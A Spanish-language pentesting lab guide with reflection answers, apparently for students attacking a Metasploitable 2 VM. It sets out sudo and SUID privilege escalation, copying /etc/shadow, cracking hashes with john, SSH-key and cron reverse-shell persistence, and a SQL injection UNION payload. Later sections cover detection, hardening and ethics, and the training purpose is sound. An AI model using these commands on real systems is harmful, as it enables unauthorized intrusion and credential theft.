>\# Explicación: Identifica todos los usuarios locales. Busca usuarios con shell=/bin/bash para posibles objetivos o víctimas.

sudo -l

>\# Salida esperada (si ejecutas como msfadmin):
>\# `User msfadmin may run the following commands on this host:`
>\# `(ALL) NOPASSWD: ALL`
>\# Explicación: En Metasploitable 2, msfadmin tiene permisos sudo sin contraseña. Esto es escalada de privilegios inmediata.

**Documenta:**

-   ¿Con qué usuario accediste? (root vs msfadmin)
-   ¿Tiene permisos sudo? (¿NOPASSWD o requiere contraseña?)
-   ¿Cuál es la versión del kernel? (Información para exploits)

### **4.2 Escalada de Privilegios (4 min)**

**Si ya eres root (desde vsftpd o Samba):**
- No se requiere escalada adicional
- Puedes proceder directamente a exfiltración de datos (sección 4.3)

**Si eres usuario sin privilegios (msfadmin desde brute force):**

#### **Opción 1: Exploit de kernel (CVE-2009-1185 udev)**

\# Identificar versión de kernel vulnerable

uname -r

>\# Salida esperada: `2.6.39-GENERIC`
>\# Explicación: Este kernel es vulnerable a CVE-2009-1185 (udev privilege escalation) que permite convertir usuario normal a root

\# Buscar exploit

searchsploit linux udev

>\# Salida esperada: Múltiples exploits para udev incluyendo CVE-2009-1185
>\# Explicación: Descarga el exploit 8572.c y compila/ejecuta para obtener shell root

#### **Opción 2: Permisos sudo mal configurados (RECOMENDADO EN METASPLOITABLE 2)**

sudo -l

>\# Salida esperada: `(ALL) NOPASSWD: ALL`
>\# Explicación: msfadmin puede ejecutar CUALQUIER comando como root SIN contraseña

sudo su -

>\# Resultado: Shell root inmediato sin requerir contraseña
>\# Explicación: El comando `su -` cambia al usuario root. Como sudo no pide contraseña, obtienes root directo.

#### **Opción 3: SUID binaries (búsqueda de binarios con permisos especiales)**

find / -perm -4000 2\>/dev/null

>\# Salida esperada: Lista de binarios con SUID bit activado
>\# Ejemplo: `/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/chsh`, etc.
>\# Explicación: SUID binarios se ejecutan con privilegios del propietario. Si propietario es root, podría haber vector de escalada.

\# Buscar SUID binarios conocidos como vulnerables

find / -perm -4000 -exec ls -la {} \; 2\>/dev/null | grep -E "nmap|find|less"

>\# Salida esperada: Si encuentra nmap con SUID, puedes hacer:
>\# `nmap --interactive`
>\# `nmap> !sh` para escapar a shell root

**Documenta (Esperado en Metasploitable 2):**

-   ¿Lograste escalada a root?
-   ¿Mediante qué método? (sudo NOPASSWD, kernel exploit, SUID binary)
-   Captura evidencia: `whoami` → debería mostrar `root`

### **4.3 Exfiltración de Datos (3 min)**

**Una vez como root, estos son los archivos críticos a extraer:**

\# Extraer archivo /etc/shadow (hashes de contraseñas de usuarios del sistema)

cat /etc/shadow \> /tmp/shadow.txt

>\# Salida esperada (primeras líneas):
>\# `root:!:17236:0:99999:7:::`
>\# `msfadmin:\$6\$yxK...:[hashes]:...`
>\# Explicación: /etc/shadow contiene hashes SHA-512 de contraseñas. Pueden crackearse offline con john/hashcat.

\# Extraer archivo /etc/passwd (usuarios del sistema, UIDs, directorios home)

cat /etc/passwd \> /tmp/passwd.txt

>\# Salida esperada:
>\# `root:x:0:0:root:/root:/bin/bash`
>\# `msfadmin:x:1000:1000:msfadmin:/home/msfadmin:/bin/bash`
>\# `postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash`
>\# Explicación: Identificar usuarios activos, sus directorios home, shells. Información crítica para lateral movement.

\# Buscar archivos interesantes en directorios de usuarios

find /home -name \"\*.txt\" -o -name \"\*.pdf\" 2\>/dev/null

>\# Salida esperada: Archivos de texto/documentos en directorios de usuarios
>\# Explicación: Busca archivos potencialmente sensibles creados por usuarios

\# Buscar archivos relacionados a contraseñas/credenciales

find / -name \"\*password\*\" 2\>/dev/null \| head -20

>\# Salida esperada:
>\# `/etc/mysql/debian.cnf` - Credenciales de MySQL
>\# `/var/www/html/config.php` - Credenciales de aplicaciones web
>\# `/home/msfadmin/.ssh/authorized_keys` - SSH keys públicas
>\# Explicación: Archivos de configuración suelen contener credenciales hardcodeadas.

\# Extraer archivos SSH para acceso remoto posterior (persistencia)

cat /root/.ssh/authorized_keys 2\>/dev/null

>\# Salida esperada: Claves SSH públicas almacenadas
>\# Explicación: Si agregas tu clave pública aquí, tendrás acceso SSH remoto permanente como root.

**Crackear hashes de contraseñas (si tienes tiempo):**

\# Combinar /etc/passwd y /etc/shadow en formato crackeable

unshadow /tmp/passwd.txt /tmp/shadow.txt \> /tmp/hashes.txt

>\# Salida esperada: Archivo con formato "usuario:hash"
>\# Explicación: unshadow prepara los hashes para herramientas de crack.

\# Intentar crackear con diccionario rockyou

john /tmp/hashes.txt \--wordlist=/usr/share/wordlists/rockyou.txt

>\# Salida esperada (si tiene éxito):
>\# `msfadmin:msfadmin`
>\# `postgres:postgres`
>\# `mysql:mysql`
>\# Explicación: Metasploitable 2 tiene contraseñas débiles. rockyou.txt es diccionario de 14M palabras más comunes.

\# Ver contraseñas crackeadas

john /tmp/hashes.txt \--show

>\# Salida esperada:
>\# `msfadmin:msfadmin:1000:1000:msfadmin:/home/msfadmin:/bin/bash`
>\# `postgres:postgres:108:117:PostgreSQL administrator,...`
>\# Explicación: Muestra contraseñas en texto plano que fueron crackeadas.

**Documenta:**

-   ¿Qué información sensible encontraste? (usuarios, rutas, servicios internos)
-   ¿Cuántas contraseñas crackeaste? (msfadmin, postgres, mysql, etc.)
-   ¿Encontraste credenciales de bases de datos/aplicaciones?
-   ¿Obtuviste acceso SSH para persistencia?

---

**CONCLUSIÓN DE POST-EXPLOTACIÓN:**

En un escenario exitoso con acceso root, el equipo habría obtenido:

## **FASE 5: DOCUMENTACIÓN FINAL (5 minutos)**

### **Objetivo**

Generar un reporte ejecutivo profesional de los hallazgos. Debes
entregarlo en MarkDown (.md)

**Template de Reporte (en MarkDown)**

**\# REPORTE DE PENTESTING - OPERACIÓN CIPHER BREACH**

**\*\*Analistas:\*\*** \[Sus nombres\]

**\*\*Fecha:\*\*** \[Fecha actual\]

**\*\*Objetivo:\*\*** \[IP de Metasploitable\]

**\*\*Tiempo total:\*\*** 60 minutos

\-\--

### **\## 1. RESUMEN EJECUTIVO**

\[2-3 líneas describiendo el nivel de compromiso logrado\]

**\## 2. HALLAZGOS CRÍTICOS**

### **\### Vulnerabilidad #1: \[Nombre\]**

\- **\*\*Severidad:\*\*** CRÍTICA/ALTA/MEDIA

\- **\*\*CVE:\*\*** \[Si aplica\]

\- **\*\*Servicio afectado:\*\*** \[Puerto y servicio\]

\- **\*\*Descripción:\*\*** \[Breve explicación\]

\- **\*\*Evidencia:\*\*** \[Comando o screenshot\]

**\### Vulnerabilidad #2: \[Nombre\]**

\[Repetir estructura\]

**\### Vulnerabilidad #3: \[Nombre\]**

\[Repetir estructura\]

### **\## 3. CADENA DE EXPLOTACIÓN**

1\. Reconocimiento: \[Herramienta usada\] → \[Hallazgo clave\]

2\. Acceso inicial: \[Vector de ataque\] → \[Resultado\]

3\. Escalada: \[Técnica usada\] → \[Privilegios obtenidos\]

4\. Exfiltración: \[Datos extraídos\]

### **\## 4. DATOS SENSIBLES COMPROMETIDOS**

\- Usuarios del sistema: \[Cantidad\]

\- Hashes extraídos: \[Cantidad\]

\- Contraseñas crackeadas: \[Cantidad\]

\- Archivos críticos: \[Lista\]

### **\## 5. RECOMENDACIONES (Top 3)**

1\. \[Recomendación más crítica\]

2\. \[Segunda recomendación\]

3\. \[Tercera recomendación\]

### **\## 6. TIMELINE DEL ATAQUE**

\- 00:00 - 10:00 → Reconocimiento

\- 10:00 - 25:00 → Análisis de vulnerabilidades

\- 25:00 - 45:00 → Explotación

\- 45:00 - 55:00 → Post-explotación

\- 55:00 - 60:00 → Documentación

\-\--

**\*\*Conclusión:\*\*** \[1-2 líneas sobre la postura de seguridad del
objetivo\]

En vista de que no se pudo completar con éxito la prueba de penetración, no se tiene un postura concreta sobre la seguridad del objetivo no obstante se pueden observar claramente fallas de seguridad por lo cual se recomienda encaracidamente revisar las vulnerabilidades y mitigarlas con prontitud.

**SECCIÓN DE CONCLUSIÓN Y REFLEXIÓN CRÍTICA**

**ANÁLISIS POST-PRÁCTICA**

Una vez completada la Operación \"CIPHER BREACH\", es fundamental que
reflexionen sobre la experiencia, analicen decisiones técnicas y
profundicen en conceptos de ciberseguridad. Esta sección está diseñada
para desarrollar pensamiento crítico y comprensión estratégica más allá
de la ejecución técnica.

**Nota importante:** Como equipo de dos analistas, deben discutir y
consensuar sus respuestas, integrando las perspectivas de ambos miembros
del equipo.

**PREGUNTAS DE REFLEXIÓN Y ANÁLISIS CRÍTICO**

## Bloque 1 — Metodología y toma de decisiones

### 1. Análisis de la cadena de ataque

- **a) ¿Cuál fue el vector de entrada más efectivo y por qué?**
  - Vector más efectivo: **Servicios web expuestos (phpMyAdmin, WebDAV, phpinfo)** y **vsftpd 2.3.4**.
  - Por qué: los servicios web facilitan acceso a la capa de aplicación (posibilidad de subir shells y extraer bases de datos) y `vsftpd 2.3.4` tiene exploits públicos que permiten RCE rápido y de alto impacto.

- **b) Si tuvieran que repetir el ejercicio, ¿cambiarían el orden de sus acciones? ¿Por qué?**
  - Sí. Orden recomendado: 1) reconocimiento rápido (nmap -sV -T4 sobre puertos comunes) y verificación manual de hallazgos de bajo coste (FTP anónimo, `/phpinfo`, `phpMyAdmin`, WebDAV); 2) explotación dirigida de vectores con PoC conocidos (vsftpd, Samba); 3) escaneos más exhaustivos y post-explotación.
  - Razonamiento: validar vectores "low-hanging" primero ahorra tiempo y evita gastar minutos en escaneos completos antes de confirmar vectores de alto impacto.

- **c) ¿En qué momento consideraron que habían "comprometido" el sistema? Justifiquen.**
  - Se considera compromiso real cuando se obtiene **ejecución remota de comandos** (shell) o **acceso administrativo funcional** (p. ej. acceso a `phpMyAdmin` con credenciales válidas). La confirmación mediante shell o credenciales operativas es la evidencia de compromiso.

- **d) Trabajo en equipo: cómo dividieron tareas y si fue efectivo**
  - División típica: uno en reconocimiento de red/servicios (`nmap`, `enum4linux`, `dirb`), otro en análisis web y explotación (`nikto`, `sqlmap`, Metasploit, payloads). Fue efectiva porque permitió paralelizar tareas y reducir tiempos de espera; recomendación: mantener comunicación constante y compartir artefactos (cookies, paths, credenciales) en tiempo real.

### 2. Gestión del tiempo y priorización

- **a) ¿Qué fase consumió más tiempo y por qué?**
  - Fase 2-3 (análisis de vulnerabilidades y explotación) consumió más tiempo. Causas: escaneos profundos, validación de sesiones/cookies (ej. `sqlmap` falló por cookie inválida) y exploits pendientes en Metasploit que requirieron reintentos.

- **b) ¿Se quedaron atascados en alguna técnica? ¿Cómo lo resolvieron?**
  - Sí: `sqlmap` falló por sesión inválida; el exploit de vsftpd quedó en espera. Resolución: recuperar sesión vía login manual en la app, reasignar tareas (uno recupera sesión, otro prepara listener/payload), y tener planes alternativos (Samba, FTP anónimo) listos.

- **c) Si tuvieran 30 minutos, ¿qué técnicas eliminarían y cuáles priorizarían?**
  - Eliminar: escaneos exhaustivos (`-p- --min-rate`), dirb/nikto masivos. Priorizar: reconocimiento rápido, verificación de FTP anónimo y `phpMyAdmin`, intento de exploits con PoC (vsftpd/Samba) y prueba de upload/reverse-shell si WebDAV está activo.

- **d) Reflexión estratégica (velocidad vs evitar detección)**
  - En un engagement real: empezar con inteligencia pasiva y pruebas de bajo ruido; usar acciones agresivas sólo si las reglas lo permiten o cuando el riesgo de detección es aceptable. Registrar acciones y usar ventanas/hosts de salto para reducir trazas.

- **e) Dinámica de equipo: desacuerdos y resolución**
  - Desacuerdos menores (priorizar web vs servicios) se resolvieron con criterio: impacto potencial (¿da root rápido?) y estimación de tiempo. Si persiste desacuerdo, usar matriz Impacto×Probabilidad para decidir.

### 3. Comparación de vectores de ataque

- **a) Ranking por efectividad (mayor → menor):**
  1. vsftpd 2.3.4 (Backdoor) — RCE directo y reproducible.
  2. Samba (usermap_script) — RCE remoto documentado.
  3. SQL Injection (phpMyAdmin/DVWA) — alto impacto si existe vulnerabilidad, dependiente de la app.
  4. SSH brute force — menos efectivo: ruidoso y lento; depende de credenciales débiles.

- **b) ¿Cuál es más difícil de detectar por Blue Team?**
  - Los vectores web (SQLi, uploads) suelen ser más fáciles de camuflar en tráfico web legítimo; brute force y exploits SMB/FTP generan patrones de red y logs más ruidosos.

- **c) ¿Cuál requiere más habilidad técnica?**
  - Explotación de Samba y post-explotación (pivoting y payload crafting) requieren más pericia; SQLi y vsftpd pueden ser más directos con herramientas existentes.

- **d) ¿Cuál sería menos probable en una organización moderna?**
  - Un servidor con `vsftpd 2.3.4` con backdoor o Samba 3.0.x sin parches es menos probable en infra moderna gestionada, pero posible en sistemas legacy o olvidados.

- **e) Perspectiva dual: diferencias de opinión y consenso**
  - Hubo discusión; se priorizó por impacto y rapidez. Consenso mediante evaluación rápida del ROI (esfuerzo vs ganancia).

---

## Bloque 2 — Comprensión técnica profunda

### 4. Análisis de vulnerabilidades críticas (ejemplo: vsftpd 2.3.4)

- **4.a Investigación — contexto histórico:**
  - `vsftpd 2.3.4` sufrió un incidente en 2011 (CVE-2011-2523): un tarball distribuido estaba comprometido con un backdoor. Fue notable porque la propia distribución se entregó con código malicioso que abría acceso remoto.

- **4.b Análisis técnico (explicado):**
  - El backdoor se activaba cuando un nombre de usuario con un patrón concreto era recibido por el servidor FTP; el código malicioso abría un canal que permitía ejecutar comandos o conectar a un shell remoto. Es decir, la ruta de autenticación incluía una condición que desplegaba un listener/pipeline de comandos no presente en la versión legítima.

- **4.c Remediación (además de actualizar):**
  - Implementar **firewall/ACLs** para limitar acceso a FTP a redes confiables.
  - Deshabilitar servicios no necesarios (usar SFTP/FTPS en su lugar).
  - Deployar **IDS/IPS** con firmas para detectar patrones del backdoor y usernames sospechosos.
  - Aplicar gestión de integridad y verificación de paquetes/firmas upstream antes de desplegar binarios.

- **4.d Detección (IOCs a buscar):**
  - Entradas de logs con usernames no habituales o patrones especiales.
  - Nuevas conexiones salientes desde el servidor o procesos que abren listeners tras sesión FTP.
  - Cambios en `crontab`, cuentas añadidas o modificaciones en `/etc/sudoers` tras actividad FTP.

- **4.e División de investigación:**
  - Recomendación: uno investiga la PoC/CVE/exploit-db y reproducibilidad; el otro define mitigaciones operativas, reglas IDS y planes de hardening.

### 5. Escalada de privilegios y post-explotación

- **5.a Técnicas para escalar a root si se entra como usuario normal:**
  - `sudo -l` para detectar entradas NOPASSWD; si existe, `sudo su -` para root.
  - Buscar SUID binaries (`find / -perm -4000`) y usar escapes (`nmap --interactive`, `less`, `vim` si son SUID) cuando sea posible.
  - Buscar exploits de kernel compatibles (`searchsploit` + compilar PoC) y ejecutarlos si el kernel es vulnerable.

- **5.b Riesgos si se obtiene root directo:**
  - Acceso total al host (leer `/etc/shadow`, instalar backdoors, borrar logs), pivoting lateral, exfiltración masiva de datos y destrucción de evidencia.

- **5.c Investigación: CVE-2009-1185 (udev) — resumen:**
  - CVE-2009-1185 afecta a `udev` y permitía escalada por manejo inseguro de creación de dispositivos; un local podía provocar que `udev` ejecutase acciones con privilegios. Es representativo de cómo kernels antiguos y utilidades del sistema pueden dejar vectores de elevación en entornos legacy.

- **5.d Persistencia (métodos ejemplares):**
  - Añadir una clave pública al `/root/.ssh/authorized_keys`.
  - Crear cron job o servicio (systemd unit) que ejecute un reverse shell o restablezca acceso tras reinicio.

- **5.e Colaboración durante post-explotación:**
  - Dividir roles (uno analiza entorno interno y documentación, otro ejecuta escalada y extracción) es más efectivo que trabajar simultáneamente en la misma shell, porque reduce colisiones y mejora cobertura.

### 6. SQL Injection — más allá de la explotación básica

- **6.a Diferencias entre In-band, Blind y Out-of-band:**
  - **In-band:** los resultados de la inyección se muestran en la misma respuesta HTTP (ej. UNION, error-based). Rápido y directo.
  - **Blind:** la aplicación no devuelve resultados; se deduce por True/False o tiempos (boolean/time-based). Más lento.
  - **Out-of-band:** la DB realiza solicitudes a un canal externo (DNS/HTTP) para exfiltrar datos cuando otros canales no funcionan.
  - **Tipo en Metasploitable 2:** típicamente **in-band** (DVWA/Mutillidae ofrecen ejemplos in-band fáciles).

- **6.b Payload manual para extraer la versión de la BD (ejemplo):**

```sql
id=1' UNION SELECT NULL, @@version-- -
```

Nota: ajustar el número y tipo de columnas según la consulta objetivo.

- **6.c Técnicas de codificación segura:**
  - Prepared statements / consultas parametrizadas.
  - Validación y saneamiento de entrada (whitelist).
  - Uso de ORM y cuentas de DB con permisos mínimos.

- **6.d Análisis de impacto adicional de SQLi:**
  - Escritura de archivos (`INTO OUTFILE`), ejecución de comandos OS (si la BD lo permite), creación/modificación de usuarios administrativos y sabotaje de datos.

- **6.e Roles complementarios durante SQLi:**
  - Uno automatiza con `sqlmap` y captura dumps; el otro construye payloads manuales, revisa tablas y correlaciona hallazgos para escalar lateralmente.

---

## Bloque 3 — Perspectiva defensiva, negocio y ética

### 7. Del Red Team al Blue Team

- **7.a Reglas y alertas concretas para detectar los ataques realizados:**
  - Regla Suricata/Snort para detectar patrones de usernames anómalos en FTP y firmas de `vsftpd` backdoor.
  - Alertas de múltiples fallos SSH (threshold) integradas con `fail2ban` y SIEM.
  - Reglas WAF para `UNION`, `@@`, `INTO OUTFILE` y cadenas típicas de SQLi.
  - Correlación: procesos que abren listeners tras conexiones FTP/web → alerta de posible backdoor.

- **7.b Plan de hardening (5 pasos prioritarios):**
  1. Deshabilitar servicios innecesarios (FTP, Telnet) y migrar a protocolos seguros (SFTP/FTPS).
  2. Patching regular y gestión de vulnerabilidades.
  3. Segmentar red (DMZ) y aplicar ACLs para servicios públicos.
  4. Habilitar logging centralizado y monitorización (SIEM, EDR).
  5. Forzar MFA y revisar `sudoers`/principio de menor privilegio.

- **7.c Archivos de log a revisar:**
  - `/var/log/auth.log` (ssh/sudo/auth)
  - `/var/log/syslog` (eventos sistema)
  - `/var/log/apache2/access.log` y `error.log` (actividad web)
  - Logs de FTP (p. ej. `/var/log/vsftpd.log`) y logs de MySQL (`/var/log/mysql/*`).

- **7.d Estrategias defensivas en ejercicio rol:**
  - Como Blue: implementar WAF, EDR/XDR y segmentación; establecer reglas de detección adaptativas. Como Red (para pruebas): usar técnicas de bajo ruido y validar detecciones.

### 8. Análisis de riesgo empresarial

- **8.a Impacto financiero (resumen):**
  - Brecha que exponga datos de clientes puede implicar multas regulatorias (GDPR), pérdida reputacional, costes de mitigación y potencial litigio: coste potencial desde decenas de miles hasta millones según escala.

- **8.b Comunicación ejecutiva (3-4 líneas):**
  - "Hemos identificado servicios y versiones obsoletas con vulnerabilidades explotables que permiten acceso remoto y posible exfiltración de datos. Recomendamos intervención inmediata para parches, segmentación y control de accesos: estas medidas reducen el riesgo de sanciones y daño reputacional."

- **8.c Priorización de remediación (Top 3):**
  1. Mitigar/eliminar `vsftpd` con backdoor o bloquear puerto 21 desde Internet.
  2. Asegurar `phpMyAdmin` y WebDAV (autenticación restringida y accesos por IP).
  3. Actualizar y endurecer Samba/NFS y aplicar controles de acceso.

- **8.d Consenso de equipo:**
  - Prioridades se decidieron combinando impacto y facilidad de mitigación (matriz Impacto×Esfuerzo).

### 9. Contexto real vs laboratorio

- **9.a Realismo:**
  - Es poco frecuente en infra bien gestionada, pero común en sistemas legacy, dispositivos olvidados o instancias públicas mal configuradas.

- **9.b Caso real (comparación breve):**
  - Equifax 2017 explotó RCE por falta de parche (Apache Struts). Similitud: vulnerabilidad conocida sin parche; diferencia: escala y vectores usados.

- **9.c Evolución de amenazas (2024-2025):**
  - Amenazas frecuentes: ataques a la cadena de suministro, configuraciones inseguras en cloud y abuso de permisos administrativos; incremento de Ransomware-as-a-Service.

- **9.d Defensa moderna que dificultaría el ataque:**
  - EDR/XDR, Zero Trust, WAF + RASP, micro-segmentación y gestión central de secretos.

- **9.e División de investigación:**
  - Repartir casos reales permitió comparar lecciones y ver que la raíz común suele ser falta de gobernanza y parcheo.

### 10. Ética, responsabilidad profesional y dinámica de equipo

- **10.a Línea ética (ejemplos):**
  - Hacking ético: pruebas con autorización y reporte responsable de fallos. Ejemplo: pentest contratado y documentado.
  - Actividad maliciosa: explotar vulnerabilidades sin permiso para extraer datos.

- **10.b Dilema ético (evidencia criminal encontrada):**
  - Detener pruebas, preservar evidencia y notificar al cliente/punto legal según políticas del engagement.

- **10.c Responsabilidad de divulgación:**
  - Seguir responsible disclosure: notificar vendor, coordinar parche y divulgación pública con mitigaciones.

- **10.d Desarrollo profesional:**
  - Seguir códigos y certificaciones (EC-Council, (ISC)², OSCP) y operar siempre con autorización escrita.

- **10.e Si un miembro propone uso no ético:**
  - Parar, documentar y escalar a la dirección; negarse a participar en actividades no autorizadas.

- **10.f Fortalezas complementarias del equipo:**
  - Uno fuerte en enumeración y exploits públicos; otro en análisis web, scripting y post-explotación — combinación efectiva.

---

**CRITERIOS DE EVALUACIÓN DE REFLEXIONES**

  -----------------------------------------------------------------------
  CRITERIO             DESCRIPCIÓN
  -------------------- --------------------------------------------------
  Profundidad técnica  Demuestran comprensión más allá de la ejecución
                       mecánica

  Pensamiento crítico  Analizan decisiones, comparan alternativas,
                       justifican elecciones

  Investigación        Incorporan información externa, CVEs, casos reales
  adicional            

  Perspectiva          Integran visión ofensiva, defensiva y empresarial
  holística            

  Colaboración         Demuestran trabajo en equipo, complementariedad y
  efectiva             consenso

                       
  -----------------------------------------------------------------------

**RECURSOS PARA INVESTIGACIÓN**

Para responder las preguntas de investigación, consulten:

**Bases de datos de vulnerabilidades:**

-   CVE Details: <https://www.cvedetails.com>

-   NVD (National Vulnerability Database): <https://nvd.nist.gov>

-   Exploit-DB: <https://www.exploit-db.com>

**Casos de estudio de ataques reales:**

-   Krebs on Security: <https://krebsonsecurity.com>

-   CISA
    Alerts: <https://www.cisa.gov/news-events/cybersecurity-advisories>

-   MITRE ATT&CK: <https://attack.mitre.org>

**Códigos de ética profesional:**

-   (ISC)² Code of Ethics: <https://www.isc2.org/Ethics>

-   EC-Council Code of
    Ethics: <https://www.eccouncil.org/code-of-ethics/>

-   SANS Cyber Security Ethics: <https://www.sans.org/about/ethics/>

**Técnicas defensivas:**

-   OWASP Top 10: <https://owasp.org/www-project-top-ten/>

-   CIS Benchmarks: <https://www.cisecurity.org/cis-benchmarks>

-   NIST Cybersecurity Framework: <https://www.nist.gov/cyberframework>

**Trabajo en equipo en ciberseguridad:**

-   SANS: Building Effective Security Teams

-   Red Team vs Blue Team Dynamics

-   Collaborative Penetration Testing Best Practices

**REFLEXIÓN FINAL**

**\"Un pentester técnicamente competente puede explotar
vulnerabilidades. Un equipo de profesionales de ciberseguridad
excepcional comprende el contexto, anticipa consecuencias, se
complementa mutuamente y comunica riesgos efectivamente.\"**

Las preguntas anteriores están diseñadas para transformarlos de
ejecutores de técnicas en pensadores estratégicos de ciberseguridad.
Tómense el tiempo necesario para reflexionar profundamente sobre cada
una, discutir entre ustedes y llegar a conclusiones consensuadas.

**La diferencia entre dos hackers trabajando en paralelo y un equipo
profesional de Red Team no está en las herramientas que usan, sino en
cómo colaboran, se complementan y aprenden juntos de la experiencia.**

|Noviembre 2025|Elaborado por Gustavo Lara Jr.|
| :- | -: |
